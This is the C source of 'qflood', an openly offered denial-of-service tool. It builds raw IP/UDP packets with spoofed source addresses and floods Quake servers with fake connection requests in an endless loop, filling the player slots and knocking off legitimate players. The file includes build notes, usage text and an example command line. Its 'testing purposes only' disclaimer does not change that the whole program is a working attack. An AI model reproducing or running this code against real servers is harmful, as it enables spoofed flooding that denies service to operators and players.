/*
  qflood.c - Written by Andy Gavin (_k3nny@Efnet,
k@EnterTheGame)
  UDP spoofing idea taken from "arnudp" by Arny
(cs6171@scitsc.wlv.ac.uk)
  Original idea discussed on Bugtraq in 1998.

  This program will fill up a Quake server with spoofed
"unconnected" clients, disallowing other players the
ability to connect to the server since the player limit
fills up quickly.  Additionally, if the server does not
support multiple clients from the same IP address, it will
 disconnect legitimate players if the spoofed connection
request matches that player.

  Compiled on linux 2.2.19 with gcc 2.91.
  Tested to work on all NetQuake servers.
  Vendor status: Not contacted, since id Software has long
abandoned Quake.

  Andy Gavin is not responsible for what you do with this
program.  This is  meant for testing purposes only.

  Greets:
  - Karen;
  - Parents, Tim, Erica, and my dog;
  - insyder, mechtoad, def, ap0k, informer, scythe, zer0v,
fain, and the rest of #clanchat on Efnet;
  - deek, cha0ticz, schmorky, Ir8Pir8, redmund, vise,
_nuclear_, and the rest of #prediction on EnterTheGame;
  - Joe W, Brian L (good luck...and we'll miss you), and the
rest of the crew at work;
  - Steve Yzerman
  - Led Zeppelin, Pearl Jam, Radiohead, and Hum
*/

#include <ctype.h>
#include <errno.h>
#include <netdb.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/types.h>

struct sockaddr sa;
struct node
{
  char *address;
  struct node *next;
};

struct node *head = NULL;
struct node *tail;

void add_address( struct node **, char * );
void sig_handler( int );

int main( int argc, char **argv )
{
  int x = 1;
  int source_port, delay, fd;
  struct sockaddr_in *p;
  struct hostent *he;
  struct node *current;
  char *temp;

  u_char thePACKET[41]=
  {
    0x45,                       /* IP version, header len */
    0x00,                       /* IP diff services field */
    0x00, 0x29,                 /* IP total length */
    0xc2, 0xb5,                 /* IP id */
    0x00, 0x00,                 /* IP fragment offset */
    0x80,                       /* IP TTL */
    0x11,                       /* IP protocol */
    0, 0,                       /* IP header checksum */
    0, 0, 0, 0,                 /* IP src */
    0, 0, 0, 0,                 /* IP dest */
    0x00, 0x00,                 /* UDP src port */
    0, 0,                       /* UDP dest port */
    0x00, 0x15,                 /* length = 21 */
    0x00, 0x00,                 /* UDP checksum */
    0x80, 0x00,                 /* Quake flags */
    0x00, 0x0d,                 /* Quake length */
    0x01,                       /* Quake command = connect
*/
    0x51, 0x55, 0x41, 0x4b,     /* Quake game = QUAKE */
    0x45, 0x00,
    0x03, 0x01                  /* Quake version = 3 */
  };

  if( argc != 5 )
  {
    fprintf( stderr, "\nqflood - floods Quake servers with
spoofed connection requests\n" );
    fprintf( stderr, "\tWritten by Andy Gavin (_k3nny@Efnet,
k@ETG)\n" );
    fprintf( stderr, "\tUsage: %s <src> <server>
<server_port> <delay>\n", *argv );
    fprintf( stderr, "\t\tsrc = comma-delimited list of
IPs/hostnames\n" );
    fprintf( stderr, "\t\tserver = Quake server
IP/hostname\n" );
    fprintf( stderr, "\t\tserver_port = Quake server port\n"
);
    fprintf( stderr, "\t\tdelay = delay between connection
requests (in msec)\n" );
    fprintf( stderr, "\t\texample: %s 10.0.0.2,10.0.0.3
10.0.0.10 26000 500\n\n", argv[0] );
    exit( 0 );
  }

  srand( time( NULL ));
  delay = atoi( argv[4] ) * 1000;

  /* build a linked list of addresses entered on command
line */
  temp = strtok( argv[1], "," );
  add_address( &head, temp );

  signal( SIGINT, sig_handler );

  tail = head;

  temp = strtok( NULL, "," );
  while( temp != NULL )
  {
    add_address( &(tail->next), temp );
    tail = tail->next;
    temp = strtok( NULL, "," );
  }

  current = head;

  while( 1 )
  {
    while( current != NULL )
    {
      if( ( he = gethostbyname( current->address )) == NULL
)
      {
        fprintf( stderr, "Can't resolve src\n" );
        exit( 0 );
      }

      bcopy( *( he->h_addr_list ), ( thePACKET + 12 ), 4 );

      if( ( he = gethostbyname( argv[2]) ) == NULL )
      {
        fprintf( stderr, "Can't resolve server\n");
        exit( 0 );
      }

      bcopy( *( he->h_addr_list ), ( thePACKET + 16 ), 4 );

      source_port = rand() % 3976 + 1024;

      *(u_short*)(thePACKET + 20) = htons( (u_short)
source_port );
      *(u_short*)(thePACKET + 22) = htons( (u_short) atoi(
argv[3] ));

      p = ( struct sockaddr_in* ) &sa;
      p->sin_family = AF_INET;
      bcopy( *( he->h_addr_list ), &(p->sin_addr), sizeof(
struct in_addr ) );

      if(( fd=socket( AF_INET, SOCK_RAW, IPPROTO_RAW )) ==
-1 )
      {
        perror( "Can't create raw socket (you must run as
root)" );
        exit( 0 );
      }

      if( setsockopt( fd, IPPROTO_IP, IP_HDRINCL, (char*)&x,
sizeof(x)) < 0 )
      {
        perror( "setsockopt IP_HDRINCL error" );
        exit( 0 );
      }

      if(( sendto( fd, &thePACKET, sizeof(thePACKET), 0,
(struct sockaddr*)p, sizeof(struct sockaddr ))) == -1)
      {
        perror( "sendto error" );
        exit( 0 );
      }

      printf( "Quake connection request sent from %s:%i to
%s:%s\n", current->address, source_port, argv[2], argv[3] );

      usleep( delay );
      current = current->next;
    }
    current = head;
  }
  exit( 1 );
}

void add_address( struct node** reference, char *data )
{
  struct node* new_node = malloc( sizeof( struct node ));

  new_node->address = data;
  new_node->next = *reference;
  *reference = new_node;
}

void sig_handler( int number )
{
  struct node *current = head;
  struct node *next;

  printf( "\nCaught SIGINT.  Cleaning up memory..." );
  while( current != NULL )
  {
    next = current->next;
    free( current );
    current = next;
  }
  printf( "done.\n\n" );
  exit( 1 );
}

